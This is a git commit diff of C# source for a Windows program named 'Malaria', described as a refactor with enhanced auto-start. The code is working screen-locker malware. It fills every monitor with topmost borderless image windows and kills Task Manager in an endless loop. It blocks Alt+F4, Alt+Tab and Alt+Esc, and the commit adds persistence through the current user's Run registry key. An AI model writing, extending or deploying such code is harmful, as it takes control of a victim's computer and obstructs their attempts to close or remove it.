b0c2c3661fbc276582dc2b08b1b3e0903efe1778
9dl <80607793+9dl@users.noreply.github.com>
2024-12-20 20:27:32 +0100

    Refactor Form class and enhance auto-start functionality

--- Form1.cs
+++ Form1.cs
@@ -1,95 +1,86 @@
-using System;
-using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 using Malaria.Properties;
+using Microsoft.Win32;
 
-namespace Malaria
+namespace Malaria;
+
+public partial class Form1 : Form
 {
-    public partial class Form1 : Form
+    public Form1()
     {
-        public Form1()
+        DisplayImageOnAllScreens();
+        new Thread(KillTaskManager).Start();
+        new Thread(AutoStart).Start();
+
+        Hide();
+        Visible = false;
+        KeyPreview = true;
+    }
+    
+    private static void AutoStart()
+    {
+        var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+        registryKey?.SetValue("Malaria", Application.ExecutablePath);
+    }
+
+    private static void DisplayImageOnAllScreens()
+    {
+        foreach (var screen in Screen.AllScreens)
         {
-            StartPosition = FormStartPosition.CenterScreen;
-            FormBorderStyle = FormBorderStyle.None;
-            WindowState = FormWindowState.Maximized;
-            TopMost = true;
-            BackgroundImageLayout = ImageLayout.Stretch;
-            DisplayImageOnAllScreens();
-            new Thread(KillTaskManager).Start();
-            this.KeyPreview = true;
+            var form = new Form
+            {
+                StartPosition = FormStartPosition.CenterScreen,
+                Location = screen.Bounds.Location,
+                Size = screen.Bounds.Size,
+                FormBorderStyle = FormBorderStyle.None,
+                WindowState = FormWindowState.Maximized,
+                TopMost = true,
+                BackgroundImageLayout = ImageLayout.Stretch
+            };
+
+            var imageResource = Resources.ResourceManager.GetObject("bg");
+            form.BackgroundImage = imageResource switch
+            {
+                byte[] imageBytes => Image.FromStream(new MemoryStream(imageBytes)),
+                Image image => image,
+                _ => form.BackgroundImage
+            };
+
+            form.Show();
         }
-        private static void DisplayImageOnAllScreens()
+    }
+
+    private static void KillTaskManager()
+    {
+        while (true)
         {
-            foreach (var screen in Screen.AllScreens)
-            {
-                var form = new Form
-                {
-                    StartPosition = FormStartPosition.CenterScreen,
-                    Location = screen.Bounds.Location,
-                    Size = screen.Bounds.Size,
-                    FormBorderStyle = FormBorderStyle.None,
-                    WindowState = FormWindowState.Maximized,
-                    TopMost = true,
-                    BackgroundImageLayout = ImageLayout.Stretch
-                };
-
-                var imageResource = Resources.ResourceManager.GetObject("bg");
-                form.BackgroundImage = imageResource switch
-                {
-                    byte[] imageBytes => Image.FromStream(new MemoryStream(imageBytes)),
-                    Image image => image,
-                    _ => form.BackgroundImage
-                };
-
-                form.Show();
-            }
+            var processes = Process.GetProcessesByName("taskmgr");
+            foreach (var process in processes) process.Kill();
         }
-        private static void KillTaskManager()
+    }
+
+    protected override void WndProc(ref Message m)
+    {
+        const int wmSysCommand = 0x0112;
+        const int scClose = 0xF060;
+        const int wmKeyDown = 0x0100;
+        const int wmKeyUp = 0x0101;
+
+        // ALT + F4
+        if (m.Msg == wmSysCommand && (int)m.WParam == scClose) return;
+
+        // Alt + Tab
+        if (m.Msg == wmKeyDown || m.Msg == wmKeyUp)
         {
-            while (true)
-            {
-                var processes = Process.GetProcessesByName("taskmgr");
-                foreach (var process in processes) process.Kill();
-            }
-        }
-        protected override void WndProc(ref Message m)
-        {
-            const int WM_SYSCOMMAND = 0x0112;
-            const int SC_CLOSE = 0xF060;
-            const int WM_KEYDOWN = 0x0100;
-            const int WM_KEYUP = 0x0101;
+            var key = (Keys)m.WParam.ToInt32();
 
-            // Block system close commands (Alt+F4)
-            if (m.Msg == WM_SYSCOMMAND && (int)m.WParam == SC_CLOSE)
-            {
-                return; // Prevent closing the window
-            }
+            // Alt+Tab is pressed
+            if ((ModifierKeys & Keys.Alt) != 0 && key == Keys.Tab) return;
 
-            // Intercept key presses to block Alt+Tab
-            if (m.Msg == WM_KEYDOWN || m.Msg == WM_KEYUP)
-            {
-                Keys key = (Keys)m.WParam.ToInt32();
-
-                // Detect Alt+Tab combination
-                if ((Control.ModifierKeys & Keys.Alt) != 0 && key == Keys.Tab)
-                {
-                    return; // Prevent Alt+Tab
-                }
-
-                // Detect Alt+Esc combination (another window-switching shortcut)
-                if ((Control.ModifierKeys & Keys.Alt) != 0 && key == Keys.Escape)
-                {
-                    return; // Prevent Alt+Esc
-                }
-            }
-
-            base.WndProc(ref m);
+            // Alt+Esc is pressed
+            if ((ModifierKeys & Keys.Alt) != 0 && key == Keys.Escape) return;
         }
 
+        base.WndProc(ref m);
     }
 }
